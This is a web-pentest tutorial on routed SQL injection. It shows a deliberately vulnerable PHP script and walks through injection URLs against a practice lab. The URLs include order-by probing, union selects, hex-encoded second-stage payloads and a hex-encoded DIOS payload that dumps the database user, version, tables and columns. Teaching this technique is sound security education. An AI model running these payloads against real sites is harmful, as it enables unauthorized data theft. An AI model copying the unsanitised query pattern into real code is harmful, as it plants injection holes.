# Routed SQL injection

[source: Zenodermus Javanicus - securityidiots.com](http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html)

Routed SQL Injection may sound a little bit different or tough for many of the injector being a new concept which confuse many of the injectors.

Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.

In simple words routed SQL injection can be a scenario when you are not able to see any output after using "union select", earlier when i was playing with SQLi i found a website where i wasnt getting any output so it just striked through my mind that may be the output is not coming to the page then it must be going somewhere, and that somewhere is an another sql query.

Here is a simple example of such script in PHP:

!!! note "`injectable.php`"
    ```php
    <?$id=$_GET['id'];$query="SELECT id,sec_code FROM users WHERE id='$id'";if (!$result=mysql_query($query,$conn))  die("Error While Selection process : " . mysql_error());if(mysql_num_rows($result) == 0)       die();$row = mysql_fetch_array($result, MYSQL_ASSOC);$query="SELECT username FROM users WHERE sec_code='".$row['sec_code']."'";echo "<br><font color=red>This is the query which gives you Output : </font>$query<br><br>";if (!$result=mysql_query($query,$conn))  die("Error While Selection process : " . mysql_error());if(mysql_num_rows($result) == 0)        die("Invalid Input parameter");$row = mysql_fetch_array($result, MYSQL_ASSOC);      echo 'Username is : ' . $row['username'] . "<br>";?>
    For the tutorial i have prepared a demo so we are gonna use it throughout this tutorial. The basics are still same but there will be small change in the type of injection. So lets start with this URL.
    ```

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1
```

---

Lets start injecting it like a normal injection.

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' order by 3--+
```

Here as we can see there is an error on third column and its working on two columns:

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' order by 2--+
```

So now we will use union select statement with two columns:

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' and false union select 1,2--+
```

---

Here we can see 2 in the second query, but there is no output after username, which is because the condition is searching for a sec_code equals to two, which may not exist. Some of you will make yourself satisfied by getting the output at place of this "2". But as we know that its not common that we will see sql queries printed on page, here i printed only to make things more clear to you. So our main target is to get the output from second query as its output. Now we know that whatever we write in place of 2 gets injected into our second query so now we will route our injection to second query by injecting the first one.

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' and false union select 1,0x27206f72207472756523--+
```

Now if you will see we crafted our query in such a manner that the second query became true and we are now able to see the output. But still the output is not controlled by us so now lets use union select statement and control the output.

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' and false union select 1,0x2720756e696f6e2073656c65637420312c3223--+
```

And Boom!! It Worked , We are able to see the vulnerable column in the output, Now lets use DIOS and finish the game..

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' and false union select 1,0x2720756e696f6e2073656c65637420636f6e636174283078346536313664363532303361336132303561363536653363363237323365353537333635373232303361336132302c7573657228292c307833633632373233653434363232303361336132302c446174616261736528292c30783363363237323365353636353732373336393666366532303361336132302c76657273696f6e28292c307833633632373233652c6d616b655f73657428362c403a3d307830612c2873656c65637428312966726f6d28696e666f726d6174696f6e5f736368656d612e636f6c756d6e73297768657265287461626c655f736368656d61213d307836393665363636663732366436313734363936663665356637333633363836353664363129616e64403a3d6d616b655f736574283531312c402c307833633663363933652c7461626c655f6e616d652c636f6c756d6e5f6e616d6529292c4029292c3223--+
```

And we are done routing the injection from the first query to the second, its not always this easy so here an another example i made which depicts a real scenario try it out:

```
http://leettime.net/sqlninja.com/tasks/routed_sqli_2.php?id=1
```
 
---

Author : Zenodermus Javanicus

Date : 2014-11-21
